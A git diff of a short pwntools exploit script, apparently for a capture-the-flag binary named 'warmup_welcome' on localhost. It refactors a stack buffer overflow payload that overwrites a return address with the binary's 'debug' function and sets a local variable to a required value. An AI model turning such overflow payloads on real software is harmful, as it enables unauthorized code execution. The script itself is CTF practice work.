@@ -1,11 +1,15 @@
 from pwn import *
 
 def exploit():
+	binary = ELF("./warmup_welcome")
 	r = remote("127.0.0.1", 8888)
-	r.sendline("Nayeon") 
-	payload = "A" * 128 # Gotten by doing Static analyzing on gdb and fuzzing so hard
-	payload += "\x71\x92\x04\x08" #address of debug
-	payload += "A" * 48 #Gotten by Fuzzing until we got the right padding for overwriting v7
+	r.sendlineafter("Team : ", "NAYEON")
+	debug = binary.symbols["debug"]
+	first_pad = 128 #Gotten by doing dynamic analyzing on gdb and fuzzing so hard
+	second_pad = 48 #Gotten by Fuzzing until we got the right padding for overwriting v7
+	payload = "A" * first_pad 
+	payload += p32(debug) #address of debug
+	payload += "A" * second_pad 
 	payload += "\x24\x23\x40" #condition of v7
 	r.sendline(payload)
 	r.interactive()
